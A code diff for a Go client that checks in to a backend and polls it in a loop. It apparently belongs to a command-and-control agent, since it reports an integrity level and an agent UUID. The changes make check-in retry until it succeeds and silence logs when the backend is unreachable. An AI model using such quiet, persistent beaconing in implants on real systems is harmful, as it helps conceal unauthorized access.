@@ -4,9 +4,13 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
+	"log"
+	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -49,19 +53,24 @@ func New(cfg Config) *Client {
 
 // Run performs a checkin then enters the poll loop until ctx is cancelled.
 func (c *Client) Run(ctx context.Context) error {
-	if err := c.checkin(ctx); err != nil {
-		return fmt.Errorf("checkin failed: %w", err)
-	}
 	t := time.NewTicker(c.cfg.Interval)
 	defer t.Stop()
 	for {
-		if err := c.pollOnce(ctx); err != nil {
-			// Log-and-continue; we don't want to exit on transient backend errors.
-			fmt.Printf("poll error: %v\n", err)
+		if c.agentID == "" {
+			if err := c.checkin(ctx); err != nil {
+				if !isUpstreamUnavailable(err) {
+					log.Printf("checkin error: %v", err)
+				}
+			}
+		} else {
+			if err := c.pollOnce(ctx); err != nil && !isUpstreamUnavailable(err) {
+				log.Printf("poll error: %v", err)
+			}
 		}
+
 		select {
 		case <-ctx.Done():
-			return ctx.Err()
+			return nil
 		case <-t.C:
 		}
 	}
@@ -111,7 +120,7 @@ func (c *Client) pollOnce(ctx context.Context) error {
 	}
 	req.Header.Set("Content-Type", "application/json")
 	if c.agentID != "" {
-		req.Header.Set("X-Agent-ID", c.agentID)
+		req.Header.Set("X-Agent-UUID", c.agentID)
 	}
 	resp, err := c.httpClient.Do(req)
 	if err != nil {
@@ -166,5 +175,29 @@ func (c *Client) buildCheckin() structs.CheckInMessage {
 		checkin.IntegrityLevel = 2
 	}
 	return checkin
+}
+
+// isUpstreamUnavailable reports whether an error indicates the UI backend
+// could not be reached (connection refused, DNS failure, timeout, etc.).
+func isUpstreamUnavailable(err error) bool {
+	if err == nil {
+		return false
+	}
+	if urlErr, ok := err.(*url.Error); ok && urlErr.Err != nil {
+		err = urlErr.Err
+	}
+	var netErr net.Error
+	if errors.As(err, &netErr) {
+		return true
+	}
+	var opErr *net.OpError
+	if errors.As(err, &opErr) {
+		return true
+	}
+	var dnsErr *net.DNSError
+	if errors.As(err, &dnsErr) {
+		return true
+	}
+	return false
 }
 
